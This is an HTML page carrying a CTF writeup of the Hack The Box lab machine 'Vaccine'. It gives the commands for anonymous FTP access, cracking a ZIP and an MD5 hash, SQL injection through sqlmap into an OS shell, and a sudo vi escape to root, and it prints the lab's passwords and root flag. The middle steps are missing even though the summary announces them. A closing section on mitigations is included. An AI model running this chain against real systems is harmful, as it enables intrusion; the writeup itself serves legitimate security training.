@@ -1,0 +1,145 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Vaccine — Hack The Box writeup | Farhan Hussain</title>
+<meta name="description" content="Three services, three layers to peel. Anonymous FTP hands you a password-protected ZIP. Crack the ZIP to get PHP source. PHP source has an MD5 hash —…">
+<link rel="canonical" href="https://thecyberfarhan.github.io/writeups/vaccine.html">
+<meta property="og:title" content="Vaccine — Hack The Box writeup">
+<meta property="og:description" content="Three services, three layers to peel. Anonymous FTP hands you a password-protected ZIP. Crack the ZIP to get PHP source. PHP source has an MD5 hash —…">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://thecyberfarhan.github.io/writeups/vaccine.html">
+<meta name="twitter:card" content="summary">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%23161b22'/%3E%3Crect x='1' y='1' width='30' height='30' rx='6' fill='none' stroke='%23B4232C' stroke-width='2'/%3E%3Ctext x='16' y='22' font-family='Arial' font-size='18' font-weight='700' text-anchor='middle' fill='%23e6edf3'%3EF%3C/text%3E%3C/svg%3E">
+<link rel="stylesheet" href="writeup.css">
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"TechArticle","headline":"Vaccine — Hack The Box writeup","description":"Three services, three layers to peel. Anonymous FTP hands you a password-protected ZIP. Crack the ZIP to get PHP source. PHP source has an MD5 hash —…","author":{"@id":"https://thecyberfarhan.github.io/#me"},"url":"https://thecyberfarhan.github.io/writeups/vaccine.html","mainEntityOfPage":"https://thecyberfarhan.github.io/writeups/vaccine.html"}</script>
+</head>
+<body>
+<div class="wrap">
+  <div class="topbar">
+    <a class="back" href="./">&larr; All writeups</a>
+    <a class="brand" href="https://thecyberfarhan.github.io/">Farhan<span>.</span></a>
+  </div>
+  <p class="eyebrow" data-reveal>Hack The Box writeup</p>
+  <h1 data-reveal>Vaccine</h1>
+  <div class="meta" data-reveal>
+    <span class="plat">Hack The Box</span>
+    <span class="diff">Very Easy</span>
+    
+  </div>
+  <div class="tldr" data-reveal><b>TL;DR</b>Three services, three layers to peel. Anonymous FTP hands you a password-protected ZIP. Crack the ZIP to get PHP source. PHP source has an MD5 hash — crack that too and you have the web admin password. The admin dashboard has a SQLi-vulnerable GET parameter against a PostgreSQL backend running as DBA, so <code>sqlmap --os-shell</code> gets you OS command execution via <code>COPY ... FROM PROGRAM</code>. Upgrade to a proper reverse shell as <code>postgres</code>, find the database password hardcoded in <code>dashboard.php</code>, use it to authenticate <code>sudo -l</code>, discover that <code>postgres</code> can run <code>vi</code> as root against a specific file. GTFOBins makes short work of that — <code>:set shell=/bin/bash</code> + <code>:shell</code> drops a root prompt, and the root flag is one <code>cat</code> away. </div>
+  <div class="tools"></div>
+  <h2 data-reveal>Introduction</h2>
+<p>Vaccine is the third box in HTB's Starting Point track, and it introduces a concept that shows up constantly in real engagements: the attacker chain where each service hands you a credential or piece of information that unlocks the next one. FTP → ZIP → PHP source → web login → SQL injection → OS shell → sudo → root. No single step is complicated, but you have to be paying attention to realize you're collecting keys, not just poking random services.</p>
+<p>The name "Vaccine" is a bit ironic given that the box's PostgreSQL instance is quite literally injecting things on your behalf. The database is running as a DBA-privileged user with <code>COPY ... FROM PROGRAM</code> enabled — a feature that was designed for data imports and has the side effect of letting you run arbitrary shell commands. As security missteps go, "DBA running the web backend" is one of the classics.</p>
+<h2 data-reveal>Recon</h2>
+<h3>Port Scan</h3>
+<pre><code>rustscan -a 10.129.29.113 --ulimit 5000 -b 2000 -t 2000 -- -sV -sC</code></pre>
+<p>Three open ports:</p>
+<table><thead><tr><th>Port</th><th>Service</th><th>Version/Notes</th></tr></thead><tbody><tr><td>21/tcp</td><td>FTP</td><td>vsftpd 3.0.3 — anonymous login allowed</td></tr><tr><td>22/tcp</td><td>SSH</td><td>OpenSSH 8.0p1 Ubuntu</td></tr><tr><td>80/tcp</td><td>HTTP</td><td>Apache 2.4.41 — "MegaCorp Login" page</td></tr></tbody></table>
+<p>The FTP anonymous login flag is the immediate priority. Everything else can wait.</p>
+<h3>Anonymous FTP Enumeration</h3>
+<pre><code>ftp anonymous@10.129.29.113</code></pre>
+<p>Password: anything (blank, <code>anonymous</code>, <code>guest</code> — vsftpd doesn't care when anonymous is enabled).</p>
+<pre><code>230 Login successful.
+ftp&gt; ls
+-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
+ftp&gt; get backup.zip</code></pre>
+<p><code>backup.zip</code> downloaded. One file, but it turns out to contain everything needed to proceed.</p>
+<h3>Web Enumeration</h3>
+<p>The HTTP service on port 80 serves a "MegaCorp Login" page with username and password fields. No guest login option this time — this one wants credentials. Filed that away and went to work on the ZIP.</p>
+<h2 data-reveal>Foothold</h2>
+<h3>Cracking the ZIP Password</h3>
+<p>The ZIP was password-protected. <code>zip2john</code> turns it into a crackable hash:</p>
+<pre><code>zip2john backup.zip &gt; backup.hash
+john backup.hash --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>
+
+<pre><code>741852963        (backup.zip/index.php)
+741852963        (backup.zip/style.css)</code></pre>
+<p>Password: <code>741852963</code>. Not exactly a passphrase designed to withstand scrutiny.</p>
+<h3>Extracting and Reading the PHP Source</h3>
+<pre><code>unzip backup.zip
+# password: 741852963</code></pre>
+<p>Extracted two files: <code>index.php</code> and <code>style.css</code>. The CSS is decorative. The PHP is the treasure:</p>
+<pre><code>cat index.php</code></pre>
+<p>Relevant section:</p>
+<pre><code>if(isset($_POST['username']) &amp;&amp; isset($_POST['password'])) {
+    if($_POST['username'] === 'admin' &amp;&amp; md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {</code></pre>
+<p>Two things confirmed: the admin username is <code>admin</code>, and the password is validated by comparing its MD5 to <code>2cb42f8734ea607eefed3b70af13bbd3</code>. MD5 is not a password hashing function — it's a checksum algorithm that John is very happy to reverse given a wordlist.</p>
+<h3>Cracking the MD5 Hash</h3>
+<pre><code>echo "2cb42f8734ea607eefed3b70af13bbd3" &gt; md5.hash
+john md5.hash --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>
+
+<pre><code>qwerty789        (?)</code></pre>
+<p>Admin password: <code>qwerty789</code>. Cracked in seconds. Rockyou continues to be the gift that keeps on giving.</p>
+<h3>Web Login</h3>
+<pre><code>http://10.129.29.113/
+Username: admin
+Password: qwerty789</code></pre>
+<p>Logged in. Redirected to <code>dashboard.php</code> — a car catalogue search page for MegaCorp. The search field queries by make/model.</p>
+<h2 data-reveal>The Full Chain</h2>
+<h3>Privilege Escalation via vi GTFOBins</h3>
+<pre><code>sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf</code></pre>
+<p>vi opened (with a terminal warning about TERM settings — <code>E558: Terminal entry not found in terminfo</code> — but opened nonetheless). From vi's Normal mode:</p>
+<pre><code>:set shell=/bin/bash</code></pre>
+<p>This tells vi which binary to use for shell escapes. Then:</p>
+<pre><code>:shell</code></pre>
+<p>This drops you to a shell with the privileges of the process running vi — which, because of <code>sudo</code>, is root.</p>
+<pre><code>root@vaccine:/var/lib/postgresql/11/main#</code></pre>
+<h3>Root Flag</h3>
+<pre><code>cd /root
+cat root.txt</code></pre>
+
+<pre><code>dd6e058e814260bc70e9bbdef2715849</code></pre>
+
+<h2 data-reveal>Rabbit Holes</h2>
+<p><strong><code>sudo -l</code> from the sqlmap os-shell:</strong> The first instinct after landing the sqlmap <code>os-shell</code> was to immediately try <code>sudo -l</code>. It returned no output. The sqlmap shell runs commands through PostgreSQL's <code>COPY ... FROM PROGRAM</code>, which lacks a TTY — so any command that requires interactive input (like a password prompt) either hangs silently or produces no output. Wasted a couple of minutes on this before upgrading to a proper reverse shell.</p>
+<p><strong>SUID binary enumeration:</strong> Ran <code>find / -perm -4000 -type f 2&gt;/dev/null</code> as postgres. The list was long — all standard Ubuntu SUID binaries (mount, su, sudo, gpasswd, etc.), nothing unusual. No custom SUID binary like Oopsie's <code>bugtracker</code>. The escalation path here was always sudo, not SUID.</p>
+<p><strong>Trying password guesses before finding <code>dashboard.php</code>:</strong> After getting the shell as <code>postgres</code>, spent a moment guessing passwords (<code>postgres</code>, <code>admin</code>, <code>vaccine</code>, the ZIP password) before running the grep against the web source files. Should have just grepped first — config files and PHP source are always the first stop for credential hunting.</p>
+<p><strong>vi terminal warning:</strong> The <code>E558: Terminal entry not found in terminfo</code> warning when launching vi looked concerning — like vi might not open properly and the GTFOBins escape might fail. In practice, vi still opened (defaulting to <code>ansi</code> terminal mode), and the <code>:set shell</code> + <code>:shell</code> sequence worked without issue. The Escape key displayed as <code>^[</code> in the shell, but the colon-prefixed commands still executed. Scary-looking, functionally irrelevant.</p>
+<h2 data-reveal>Mitigations</h2>
+<p><strong>Anonymous FTP with sensitive files:</strong> The FTP service permitted anonymous read access and exposed <code>backup.zip</code> — a file containing application source code with embedded credentials. If FTP is required at all, anonymous access should be disabled. Sensitive backup files should never be accessible to unauthenticated users, regardless of protocol.</p>
+<p><strong>Weak ZIP password and MD5 password storage:</strong> <code>741852963</code> is a sequential keypad pattern and falls in the top 10% of rockyou entries. More critically, the application stored the admin password as a raw MD5 hash. MD5 is cryptographically broken for password storage — use bcrypt, scrypt, or Argon2 with appropriate work factors. The combination of a weak password and a fast hash meant cracking took seconds.</p>
+<p><strong>SQL Injection in GET parameter:</strong> The <code>search</code> parameter was passed directly into a SQL query with no parameterization. All database queries should use prepared statements with bound parameters. Input validation is a secondary defense, not a substitute for parameterization.</p>
+<p><strong>PostgreSQL DBA running the web backend:</strong> The web application connected to PostgreSQL as a DBA-privileged superuser. This is what enabled <code>COPY ... FROM PROGRAM</code> for OS command execution. Application database users should be granted only the minimum necessary privileges — SELECT/INSERT/UPDATE/DELETE on their own tables, nothing more. A least-privilege DB user cannot run <code>COPY ... FROM PROGRAM</code> regardless of what SQL injection succeeds.</p>
+<p><strong>Hardcoded database credentials in source:</strong> <code>dashboard.php</code> contained the full PostgreSQL connection string including the plaintext password. Database credentials belong in environment variables or a secrets manager, not in source code or config files that a shell user can read.</p>
+<p><strong><code>sudo</code> on a shell-capable editor:</strong> Granting sudo access to <code>vi</code>, <code>vim</code>, <code>nano</code>, <code>less</code>, <code>more</code>, <code>awk</code>, <code>perl</code>, <code>python</code>, or any other program that can spawn a shell is functionally equivalent to granting a root shell. The file restriction in sudoers (<code>/bin/vi /etc/postgresql/11/main/pg_hba.conf</code>) does not help — the editor itself can spawn a shell regardless of which file it opened. If editing a specific file as root is genuinely required, consider using <code>sudoedit</code> (which invokes the editor with dropped privileges after copying the file) rather than <code>sudo vi</code>.</p>
+  <div class="takeaway" data-reveal><b>Key takeaway</b>This box is a clean demonstration of credential chaining: each service exposes just enough information to compromise the next one. FTP hands you the ZIP password's hash target; the ZIP exposes the web password hash; the web login grants access to the SQL injection; the SQL injection reaches the OS; and the OS user's password (found in a hardcoded config) unlocks the sudo rule that hands you root.  The critical technical lesson is PostgreSQL DBA privilege. <code>COPY ... FROM PROGRAM</code> is a documented, legitimate feature — but in the context of a SQL-injectable web application, it's an OS command execution primitive. Running web application database connections as superuser is the mistake that turned SQL injection into a full shell.  The sudo escalation reinforces a point worth repeating: editors are shells. Any sudoers entry allowing <code>vi</code>, <code>vim</code>, <code>nano</code>, <code>less</code>, <code>more</code>, or their relatives gives the grantee a root shell. The file restriction is theater.</div>
+  <h2 data-reveal>If I Did It Again</h2>
+<p>I'd grep the PHP source files for credentials immediately after landing the shell, before trying anything else. The pattern <code>grep -rEi 'pass|connect|password' /var/www/html/</code> takes five seconds and would have surfaced <code>P@s5w0rd!</code> before I wasted time trying sudo without a password.</p>
+<p>For the sqlmap phase: I'd go straight to <code>--os-shell</code> after confirming the injection type, rather than running additional enumeration queries first. When you have stacked queries in PostgreSQL as DBA, <code>--os-shell</code> is the direct path — there's nothing the SQL enumeration would tell you that a shell couldn't tell you better.</p>
+<p>The PTY upgrade step is worth doing immediately after the reverse shell connects — before any other enumeration. <code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code> takes two seconds and makes everything else in the session more reliable. Running sudo without a proper PTY produces the "a terminal is required to read the password" error and wastes time debugging what should be a trivial password entry.</p>
+  <div class="cta-row">
+    <a class="btn primary" href="https://github.com/thecyberfarhan/CTF-Writeups/blob/main/HackTheBox/vaccine_writeup.md" target="_blank" rel="noopener">Full writeup on GitHub &rarr;</a>
+    <a class="btn" href="./">More writeups</a>
+  </div>
+  <footer>Part of <a href="https://thecyberfarhan.github.io/">thecyberfarhan.github.io</a>. Auto-generated from the <a href="https://github.com/thecyberfarhan/CTF-Writeups">CTF-Writeups</a> repo — edits happen there, not here.</footer>
+</div>
+<script>
+document.querySelectorAll('pre').forEach(function (pre) {
+  var btn = document.createElement('button');
+  btn.className = 'copy-btn';
+  btn.type = 'button';
+  btn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg><span>Copy</span>';
+  btn.addEventListener('click', function () {
+    var code = pre.querySelector('code');
+    var text = code ? code.textContent : pre.textContent;
+    navigator.clipboard.writeText(text).then(function () {
+      btn.classList.add('copied');
+      btn.querySelector('span').textContent = 'Copied';
+      setTimeout(function () { btn.classList.remove('copied'); btn.querySelector('span').textContent = 'Copy'; }, 1500);
+    }).catch(function () {});
+  });
+  pre.appendChild(btn);
+});
+if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+  var io = new IntersectionObserver(function (es) {
+    es.forEach(function (e) { if (e.isIntersecting) { e.target.classList.add('in'); io.unobserve(e.target); } });
+  }, { threshold: 0.1 });
+  document.querySelectorAll('[data-reveal]').forEach(function (el) { io.observe(el); });
+} else {
+  document.querySelectorAll('[data-reveal]').forEach(function (el) { el.classList.add('in'); });
+}</script>
+</body>
+</html>
